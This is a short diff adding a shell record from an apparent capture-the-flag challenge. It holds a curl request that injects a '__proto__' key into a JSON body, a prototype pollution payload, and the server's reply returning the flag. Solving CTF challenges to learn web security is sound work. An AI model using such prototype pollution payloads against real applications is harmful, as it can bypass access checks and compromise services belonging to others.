@@ -1,0 +1,2 @@
+$ curl -X POST -H "Content-type: application/json" http://invisible-ink.c.ctf-snyk.io/echo -d '{"message": "ping", "__proto__":{"flag":"true"}}'
+{"userID":"173.164.152.218, 34.117.102.82","time":1682466390026,"message":"ping","flag":"SNYK{6a6a6fff87f3cfdca056a077804838d4e87f25f6a11e09627062c06f142b10dd}"}
